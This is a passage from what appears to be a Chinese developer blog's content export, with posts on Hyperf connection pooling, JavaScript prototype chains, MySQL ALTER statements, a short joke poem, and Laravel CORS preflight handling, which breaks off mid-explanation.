&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$connection</span> <span class="keyword">instanceof</span> ConnectionInterface) &#123;</span><br><span class="line">        <span class="variable">$pool</span> = <span class="variable language_">$this</span>-&gt;factory-&gt;<span class="title function_ invoke__">getPool</span>(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$connection</span> = <span class="variable">$pool</span>-&gt;<span class="title function_ invoke__">get</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// PDO is initialized as an anonymous function, so there is no IO exception,</span></span><br><span class="line">            <span class="comment">// but if other exceptions are thrown, the connection will not return to the connection pool properly.</span></span><br><span class="line">            <span class="variable">$connection</span> = <span class="variable">$connection</span>-&gt;<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">            <span class="title class_">Context</span>::<span class="title function_ invoke__">set</span>(<span class="variable">$id</span>, <span class="variable">$connection</span>);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title class_">Coroutine</span>::<span class="title function_ invoke__">inCoroutine</span>()) &#123;</span><br><span class="line">                <span class="title function_ invoke__">defer</span>(function () <span class="keyword">use</span> ($<span class="title">connection</span>, $<span class="title">id</span>) &#123;</span><br><span class="line">                    <span class="title">Context</span>::<span class="title">set</span>($<span class="title">id</span>, <span class="title">null</span>);</span><br><span class="line">                    <span class="variable">$connection</span>-&gt;<span class="title function_ invoke__">release</span>();</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$connection</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此处使用了连接池，连接池的db实现是 <code>Hyperf\DbConnection\Pool\DbPool</code> 和 <code>Hyperf\DbConnection\Connection</code> ，具体可以看源码。</p>
<p>上面<code>connection</code> 方法使用了<code>defer</code> 方法，会在协程结束即请求结束时将db连接放回连接池；</p>
]]></content>
      <categories>
        <category>php</category>
        <category>hyperf</category>
      </categories>
      <tags>
        <tag>连接池</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈原型链</title>
    <url>/2023/07/12/javascript-prototype/</url>
    <content><![CDATA[<h3 id="上题"><a href="#上题" class="headerlink" title="上题"></a>上题</h3><p>先上前菜看段代码，思考以下几个问题</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"># test.<span class="property">ts</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Thing</span> &#123;</span><br><span class="line">  born = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;time to born&quot;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">die</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;time to die&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Thing</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name = <span class="string">&quot;dog&quot;</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  eat = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;eat&quot;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">say</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hi, i&#x27;m <span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cat = <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&quot;cat&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> dog = <span class="keyword">new</span> <span class="title class_">Thing</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>以下几个的值分别是什么</p>
<ol>
<li><code>Object.getOwnPropertyNames(cat)</code></li>
<li><code>Object.getOwnPropertyNames(dog)</code></li>
<li><code>Object.getOwnPropertyNames(Object.getPrototypeOf(cat))</code></li>
<li><code>Object.getOwnPropertyNames(Object.getPrototypeOf(dog))</code></li>
<li><code>Object.getOwnPropertyNames(Animal)</code></li>
<li><code>Object.getOwnPropertyNames(Thing)</code><span id="more"></span></li>
</ol>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><h4 id="1-Object-getOwnPropertyNames-cat"><a href="#1-Object-getOwnPropertyNames-cat" class="headerlink" title="1. Object.getOwnPropertyNames(cat)"></a>1. <code>Object.getOwnPropertyNames(cat)</code></h4><p><code>cat</code>对象由<code>Animal</code>类实例化而来，继承Animal类(及其父类及父类的父类…)的所有属性，即<code>[ &#39;born&#39;, &#39;eat&#39;, &#39;name&#39; ]</code></p>
<h4 id="2-Object-getOwnPropertyNames-dog"><a href="#2-Object-getOwnPropertyNames-dog" class="headerlink" title="2. Object.getOwnPropertyNames(dog)"></a>2. <code>Object.getOwnPropertyNames(dog)</code></h4><p>同理1，dog对象继承Thing，拥有的属性是<code>[ &#39;born&#39; ]</code></p>
<h4 id="3-Object-getOwnPropertyNames-Object-getPrototypeOf-cat"><a href="#3-Object-getOwnPropertyNames-Object-getPrototypeOf-cat" class="headerlink" title="3. Object.getOwnPropertyNames(Object.getPrototypeOf(cat))"></a>3. <code>Object.getOwnPropertyNames(Object.getPrototypeOf(cat))</code></h4><p><code>cat</code>对象的原型对象即<code>Animal.prototype</code>，<strong>原型对象默认有一个constructor属性指向构造函数本身</strong>，即<code>Animal.prototype.constructor = Animal</code>，再加上<code>Animal</code>类本身定义的say方法，所以结果是<code>[ &#39;constructor&#39;, &#39;say&#39; ]</code></p>
<h4 id="4-Object-getOwnPropertyNames-Object-getPrototypeOf-dog"><a href="#4-Object-getOwnPropertyNames-Object-getPrototypeOf-dog" class="headerlink" title="4. Object.getOwnPropertyNames(Object.getPrototypeOf(dog))"></a>4. <code>Object.getOwnPropertyNames(Object.getPrototypeOf(dog))</code></h4><p>同理3，结果是<code>[ &#39;constructor&#39;, &#39;die&#39; ]</code></p>
<h4 id="5-Object-getOwnPropertyNames-Animal"><a href="#5-Object-getOwnPropertyNames-Animal" class="headerlink" title="5. Object.getOwnPropertyNames(Animal)"></a>5. <code>Object.getOwnPropertyNames(Animal)</code></h4><p>这个有点绕，在一切皆对象的<code>JavaScript</code>中，<code>Animal</code>类也是一个函数对象，实例化内置的<code>Function</code>对象而来，底层的定义类似于<code>let Animal = new Function(&#39;name&#39;, &#123; ...Animal构造函数的方法体... &#125;)</code>，所以继承了Function的所有属性，即<code>[ &#39;length&#39;, &#39;name&#39;, &#39;arguments&#39;, &#39;caller&#39;, &#39;prototype&#39; ]</code>(ES5, 新标准中Function的属性有所出入，此处暂不考虑)</p>
<h4 id="6-Object-getOwnPropertyNames-Thing"><a href="#6-Object-getOwnPropertyNames-Thing" class="headerlink" title="6. Object.getOwnPropertyNames(Thing)"></a>6. <code>Object.getOwnPropertyNames(Thing)</code></h4><p>同理5，结果一样是<code>[ &#39;length&#39;, &#39;name&#39;, &#39;arguments&#39;, &#39;caller&#39;, &#39;prototype&#39; ]</code></p>
<h3 id="深入"><a href="#深入" class="headerlink" title="深入"></a>深入</h3><p>上面出现了三类数据</p>
<ol>
<li>类/class，即<code>Animal</code>、<code>Thing</code></li>
<li>类的实例，即<code>cat</code>、<code>dog</code></li>
<li>原型对象，即<code>Object.getPrototypeOf(cat)</code>、<code>Object.getPrototypeOf(dog)</code></li>
</ol>
<p>这三者之间的关联说简单也简单，说难也难，对于从其他语言转过来的筒子来说概念上很容易绕晕，首先看第3个本文重点关注的原型对象</p>
<h4 id="原型对象"><a href="#原型对象" class="headerlink" title="原型对象"></a>原型对象</h4><p>原型对象相关的概念有4个：<code>__proto__</code>、<code>prototype</code>、<code>Object.setPrototypeOf</code>和<code>Object.getPrototypeOf</code>，我们看下它们的作用及历史渊源：</p>
<blockquote>
<ul>
<li><p>构造函数的 “prototype” 属性自古以来就起作用。这是使用给定原型创建对象的最古老的方式。</p>
</li>
<li><p>之后，在 2012 年，Object.create 出现在标准中。它提供了使用给定原型创建对象的能力。但没有提供 get/set 它的能力。一些浏览器实现了非标准的 __proto__ 访问器，以为开发者提供更多的灵活性。</p>
</li>
<li><p>之后，在 2015 年，Object.setPrototypeOf 和 Object.getPrototypeOf 被加入到标准中，执行与 __proto__ 相同的功能。由于 __proto__ 实际上已经在所有地方都得到了实现，但它已过时，所以被加入到该标准的附件 B 中，即：在非浏览器环境下，它的支持是可选的。</p>
</li>
<li><p>之后，在 2022 年，官方允许在对象字面量 {…} 中使用 __proto__（从附录 B 中移出来了），但不能用作 getter/setter obj.__proto__（仍在附录 B 中）。</p>
</li>
</ul>
</blockquote>
<p><em>引用自<a href="https://zh.javascript.info/prototype-methods">https://zh.javascript.info/prototype-methods</a></em></p>
<p>简单来讲，目前的标准有两种获取原型对象的方式，<code>prototype</code>和<code>Object.getPrototypeOf</code>，而且有使用限制：</p>
<ul>
<li><code>prototype</code>只能用于构造函数，如本文中的<code>Animal</code>、<code>Thing</code></li>
</ul>
<p>这句话除了含有<strong>非构造函数只能用<code>Object.getPrototypeOf</code>获取原型对象</strong>的意义外，还隐藏着另外一个原则，即<strong>构造函数也可以用<code>Object.getPrototypeOf</code>获取原型对象</strong>，这含义真的是九曲十八弯，脑袋冒烟不打紧，我们继续看，根据<code>JavaScript</code>原型链的定义，可得出以下结论：</p>
<ol>
<li><code>Object.getPrototypeOf(cat)</code> = <code>Animal.prototype</code></li>
<li><code>Object.getPrototypeOf(dog)</code> = <code>Thing.prototype</code></li>
<li><code>Object.getPrototypeOf(Animal.prototype)</code> = <code>Thing.prototype</code></li>
<li><code>Object.getPrototypeOf(Thing.prototype)</code> = <code>Object.prototype</code></li>
<li><code>Object.getPrototypeOf(Object.prototype)</code> = <code>null</code></li>
</ol>
<p>这个就是经典的原型链，这也是<code>JavaScript</code> <em>一切都从对象继承而来</em> 的原因，上面刚说了<em>构造函数也可以用<code>Object.getPrototypeOf</code>获取原型对象</em>，那<code>Animal</code>和<code>Thing</code>的原型对象分别是啥？<code>Object.getPrototypeOf(Thing) = ?</code></p>
<h4 id="类"><a href="#类" class="headerlink" title="类"></a>类</h4><p><code>class</code>关键字非严谨层面可以看作一个语法糖，通过编译后的js关键代码可见一斑：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"># test.<span class="property">js</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Thing</span> = <span class="comment">/** <span class="doctag">@class</span> */</span> (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">Thing</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">born</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;time to born&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Thing</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">die</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;time to die&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Thing</span>;</span><br><span class="line">&#125;());</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>class中定义的属性及<code>constructor</code>方法逻辑构成了同名的函数(即构造函数)，定义的方法被加在构造函数的原型链上(<code>prototype</code>)；</p>
<p>而实例化对象的关键字<code>new</code>底层的逻辑大致是以下三步：</p>
<ol>
<li>创建一个新对象</li>
<li>执行构造函数，并将this指向当前的新对象</li>
<li>将新对象的原型对象设置为构造函数的原型对象</li>
</ol>
<p>第2步使实例化的对象继承了类的所有属性，可以解释<code>Object.getOwnPropertyNames(cat)</code>和<code>Object.getOwnPropertyNames(dog)</code>的值；</p>
<p>第3步原型对象的设置，使实例化的对象继承了原型链上的所有方法，可以解释<code>Object.getOwnPropertyNames(Object.getPrototypeOf(cat))</code>和<code>Object.getOwnPropertyNames(Object.getPrototypeOf(dog))</code>的值；</p>
<p>那上小节提及的<code>Animal</code>构造函数对象本身的原型链(<code>Object.getPrototypeOf(Animal)</code>)和<code>Thing</code>构造函数对象本身的原型链(<code>Object.getPrototypeOf(Thing)</code>)的值又是什么呢？</p>
<p>其实上面稍为提到过，构造函数对象本身是由内建的类型<code>Function</code>实例化而来，以此可推论出<code>Object.getPrototypeOf(Thing)</code> = <code>Function.prototype</code>，简单来讲这里的<code>Thing</code>和<code>Function</code>类比于前面的<code>dog</code>和<code>Thing</code>，这里的绕在于<code>JavaScript</code>的类型系统，<code>class Thing</code>表面是一个类，实际上是一个构造函数，而底层又是<code>Function</code>类的实例，<code>Thing</code>是别人(Function)的实例，它又可以再实例出别的实例(dog)，实例实例无穷尽也~ 其实站在<code>JavaScript</code>一切皆对象的角度看，没有那些眼花缭乱的类呀、实例呀、函数呀、字符串呀、整数呀、布尔值呀等等，对v8来讲都是<code>object</code>，等等，是不是还有漏了个<code>Animal</code>，<code>Object.getPrototypeOf(Animal)</code> = ？</p>
<p>这里又不得不提<code>extends</code>关键字了，和<code>class</code>类似，也是一个语法糖，咱直接看编译后的js关键代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"># test.<span class="property">js</span></span><br><span class="line"><span class="keyword">var</span> __extends = (<span class="variable language_">this</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">__extends</span>) || (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> extendStatics = <span class="keyword">function</span> (<span class="params">d, b</span>) &#123;</span><br><span class="line">        extendStatics = <span class="title class_">Object</span>.<span class="property">setPrototypeOf</span> ||</span><br><span class="line">            (&#123; <span class="attr">__proto__</span>: [] &#125; <span class="keyword">instanceof</span> <span class="title class_">Array</span> &amp;&amp; <span class="keyword">function</span> (<span class="params">d, b</span>) &#123; d.<span class="property">__proto__</span> = b; &#125;) ||</span><br><span class="line">            <span class="keyword">function</span> (<span class="params">d, b</span>) &#123; <span class="keyword">for</span> (<span class="keyword">var</span> p <span class="keyword">in</span> b) <span class="keyword">if</span> (<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(b, p)) d[p] = b[p]; &#125;;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">extendStatics</span>(d, b);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">d, b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> b !== <span class="string">&quot;function&quot;</span> &amp;&amp; b !== <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TypeError</span>(<span class="string">&quot;Class extends value &quot;</span> + <span class="title class_">String</span>(b) + <span class="string">&quot; is not a constructor or null&quot;</span>);</span><br><span class="line">        <span class="title function_">extendStatics</span>(d, b);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">__</span>(<span class="params"></span>) &#123; <span class="variable language_">this</span>.<span class="property">constructor</span> = d; &#125;</span><br><span class="line">        d.<span class="property"><span class="keyword">prototype</span></span> = b === <span class="literal">null</span> ? <span class="title class_">Object</span>.<span class="title function_">create</span>(b) : (__.<span class="property"><span class="keyword">prototype</span></span> = b.<span class="property"><span class="keyword">prototype</span></span>, <span class="keyword">new</span> <span class="title function_">__</span>());</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Animal</span> = <span class="comment">/** <span class="doctag">@class</span> */</span> (<span class="keyword">function</span> (<span class="params">_super</span>) &#123;</span><br><span class="line">    <span class="title function_">__extends</span>(<span class="title class_">Animal</span>, _super);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">Animal</span>(<span class="params">type</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (type === <span class="keyword">void</span> <span class="number">0</span>) &#123; type = <span class="string">&quot;dog&quot;</span>; &#125;</span><br><span class="line">        <span class="keyword">var</span> _this = _super.<span class="title function_">call</span>(<span class="variable language_">this</span>) || <span class="variable language_">this</span>;</span><br><span class="line">        _this.<span class="property">eat</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;eat&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        _this.<span class="property">type</span> = type;</span><br><span class="line">        <span class="keyword">return</span> _this;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">say</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hi, i&#x27;m &quot;</span>.<span class="title function_">concat</span>(<span class="variable language_">this</span>.<span class="property">type</span>));</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Animal</span>;</span><br><span class="line">&#125;(<span class="title class_">Thing</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有两个关键点：</p>
<ol>
<li><p><code>extendStatics(d, b)</code>其实执行了<code>Object.setPrototypeOf(d, b)</code>，在本文中即<code>Object.setPrototypeOf(Animal, Thing)</code>，这一下子不就找到了答案？<code>Object.getPrototypeOf(Animal)</code> = <code>Thing</code>；</p>
</li>
<li><p><code>d.prototype = b === null ? Object.create(b) : (__.prototype = b.prototype, new __());</code><br>这行代码大致可以拆分为以下几个流程：</p>
<ol>
<li>覆盖__的原型链: __.prototype = b.prototype</li>
<li>使用__构造函数创建对象abc: let abc = { constructor: d; }</li>
<li>设置abc的原型对象: abc.__proto__ = b.prototype;</li>
<li>设置d的原型对象: d.prototype = abc</li>
</ol>
<p> 这个流程中，第一次看到整篇都在谈却一直没见踪影的的原型对象本尊，上面通过<code>prototype</code>和<code>Object.getPrototypeOf</code>获取到的就是abc这样的原型对象，结合我们的实例可得出：<code>Object.getPrototypeOf(cat)</code> = <code>Animal.prototype</code> = <code>abc</code>，<code>Object.getPrototypeOf(Animal.prototype)</code> = <code>abc.__proto__</code> = <code>Thing.prototype</code>，跟我们上面谈到的也对上了号</p>
</li>
</ol>
<h3 id="献祭"><a href="#献祭" class="headerlink" title="献祭"></a>献祭</h3><p>最后祭出这张神图！！</p>
<p><img src="https://i.imgloc.com/2023/07/12/VgXXkZ.png" alt="VgXXkZ.png"></p>
<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>完结撒花🎉，原型链在日常开发中直接碰到的不多，但每次遇到相关的问题都会很难绕出来，所以大致做了一下总结，有纰漏及错误之处还请勇猛指出</p>
<p>本文完整示例代码：<a href="https://github.com/tashuo/note/tree/master/typescript/prototype">https://github.com/tashuo/note/tree/master/typescript/prototype</a></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zh.javascript.info/prototypes">https://zh.javascript.info/prototypes</a></p>
<p><a href="https://juejin.cn/post/6844903989088092174">https://juejin.cn/post/6844903989088092174</a></p>
]]></content>
      <categories>
        <category>typescript</category>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>prototype</tag>
        <tag>原型链</tag>
      </tags>
  </entry>
  <entry>
    <title>我不会织毛衣</title>
    <url>/2016/12/20/kidding/</url>
    <content><![CDATA[<br/>
<center>我深深的爱着你😚</center>
<center>你却爱着一个傻逼😞</center>
<center>傻逼也没关系😉</center> 
<center>我就是 那个傻逼😎</center>
<center>啦啦啦啦啦啦啦</center>
<center>...</center>


]]></content>
      <categories>
        <category>生活</category>
      </categories>
  </entry>
  <entry>
    <title>MySQL常用表结构调整语句</title>
    <url>/2016/12/19/mysql-alter-sqls/</url>
    <content><![CDATA[<ul>
<li><p>  修改表的引擎<br><code>mysql&gt; ALTER TABLE $table_name ENGINE = InnodB;</code></p>
</li>
<li><p>  修改表名<br><code>mysql&gt; RENAME TABLE $old_table_name TO $new_table_name</code></p>
</li>
<li><p>  增加主键/索引<br><code>mysql&gt; ALTER TABLE $tableName ADD (PRIMARY) KEY ($column)</code></p>
</li>
<li><p>  待续…</p>
</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Laravel跨域处理</title>
    <url>/2020/06/05/laravel-cors/</url>
    <content><![CDATA[<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>在前后端分离的应用中，需要使用CORS完成跨域访问。在CORS中发送 <code>非简单请求</code>时，前端会发一个请求方式为OPTIONS的预请求，前端只有收到服务器对这个OPTIONS请求的正确响应，才会发送正常的请求，否则将抛出跨域相关的错误。</p>
<h4 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h4><h5 id="可实现跨域的方式"><a href="#可实现跨域的方式" class="headerlink" title="可实现跨域的方式"></a>可实现跨域的方式</h5><ul>
<li>JSONP</li>
<li>CORS</li>
<li>Flash</li>
<li>服务器中转</li>
</ul>
<p>比较常用的是 <code>JSONP</code>和 <code>CORS</code>，而后者相对前者来说有更方便实用：</p>
<ol>
<li><code>JSONP</code>只能实现<code>GET</code>请求，而<code>CORS</code>支持所有类型的HTTP请求。</li>
<li>使用<code>CORS</code>，开发者可以使用普通的<code>XMLHttpRequest</code>发起请求和获得数据，比起<code>JSONP</code>有更好的错误处理。</li>
</ol>
<p>此文暂不介绍jsonp</p>
<h5 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h5><blockquote>
<p><code>CORS</code>是一种网络浏览器的技术规范，它为Web服务器定义了一种方式，允许网页从不同的域访问其资源。而这种访问是被同源策略所禁止的。<code>CORS</code>系统定义了一种浏览器和服务器交互的方式来确定是否允许跨域请求。<br>使用 <code>CORS</code>的方式非常简单，但是需要同时对前端和服务器端做相应处理。</p>
</blockquote>
<p><strong>客户端使用XmlHttpRequest发起Ajax请求，当前绝大部分浏览器已经支持CORS方式，且主流浏览器均提供了对跨域资源共享的支持。</strong></p>
<p>如上所述，接着只需<strong>在服务端配置可允许跨域的header</strong>即可:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment"># TestController.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 跨域头</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Origin: *&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p>之后测试发现 <code>GET</code> 网络请求正常，不会报跨域的错误，但是被调用方一直报调用方未登录的异常，定位到是调用方的cookie无法传输给被调用方，查到是需要手动在ajax中增加配置 <code>withCredentials: true</code></p>
<blockquote>
<p><em>XMLHttpRequest.withCredentials</em></p>
<p>跨域请求是否提供凭据信息(cookie、HTTP认证及客户端SSL证明等)<br>也可以简单的理解为，当前请求为跨域类型时是否在请求中协带cookie。</p>
</blockquote>
<p>需要注意的是调用方配置了该参数后，被调用方的header中必须指定 <code>Access-Control-Allow-Origin</code> 的值，不可以用 <code>*</code>，不然会报错：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Response</span> to preflight request doesn<span class="string">&#x27;t pass access control check: A wildcard &#x27;</span>*<span class="string">&#x27; cannot be used in the &#x27;</span><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Origin</span><span class="string">&#x27; header when the credentials flag is true. </span></span><br><span class="line"><span class="string">Origin &#x27;</span><span class="literal">null</span><span class="string">&#x27; is therefore not allowed access. </span></span><br><span class="line"><span class="string">The credentials mode of an XMLHttpRequest is controlled by the withCredentials attribute.</span></span><br></pre></td></tr></table></figure>

<p>更新后的服务端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment"># TestController.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$origin</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;ORIGIN&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Origin: &#x27;</span> . <span class="variable">$origin</span>);</span><br><span class="line">        <span class="comment">// 定义支持哪些方法的跨域请求</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE&#x27;</span>);</span><br><span class="line">        <span class="comment">// 服务端开启Access-Control-Allow-Credentials的支持</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Credentials: true&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此一般的 <code>GET</code> 跨域携带cookie的请求可以正常完成，那么 <code>POST</code>、<code>PUT</code>、<code>DELETE</code>这些请求呢？</p>
<h5 id="Preflighted-Requests-预检请求"><a href="#Preflighted-Requests-预检请求" class="headerlink" title="Preflighted Requests(预检请求)"></a>Preflighted Requests(预检请求)</h5><blockquote>
<p>Preflighted Requests是CORS中一种透明服务器验证机制。预检请求首先需要向另外一个域名的资源发送一个 HTTP OPTIONS 请求头，其目的就是为了判断实际发送的请求是否是安全的。</p>
</blockquote>
<h6 id="什么是OPTIONS请求"><a href="#什么是OPTIONS请求" class="headerlink" title="什么是OPTIONS请求"></a>什么是OPTIONS请求</h6><blockquote>
<p><a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html">https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html</a></p>
</blockquote>
<p>RFC2616标准（现行的HTTP/1.1）中定义了  <code>options</code>请求，主要用途有两个：</p>
<ol>
<li>获取服务器支持的HTTP请求方法</li>
<li>用来检查服务器的性能</li>
</ol>
<p>什么情况会触发预检请求呢？就是上面提到的<code>POST</code>、<code>PUT</code>、<code>DELETE</code>等请求，大概来讲就是<br>RFC2616标准中规定的一些非 <code>Safe Methods</code>。</p>
<p>回过头看，现在js代码加上发起 <code>POST</code>的ajax请求，打开控制台发现只有一条 <code>OPTIONS</code>请求，并无 <code>POST</code>，而且报了跟最开始 <code>GET</code>请求一样的跨域错误，什么情况？</p>
<h5 id="Laravel路由逻辑"><a href="#Laravel路由逻辑" class="headerlink" title="Laravel路由逻辑"></a>Laravel路由逻辑</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment"># routes/api.php</span></span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/test&#x27;</span>, <span class="string">&#x27;TestController@test&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>路由文件中并未定义‘/test’的 <code>OPTIONS</code>类型请求，laravel是怎么匹配且响应200的？分析也可发现这个 <code>OPTIONS</code>请求没有进到此api路由文件的生命周期内，因为没有加上允许跨域的头部，问题在哪儿？</p>
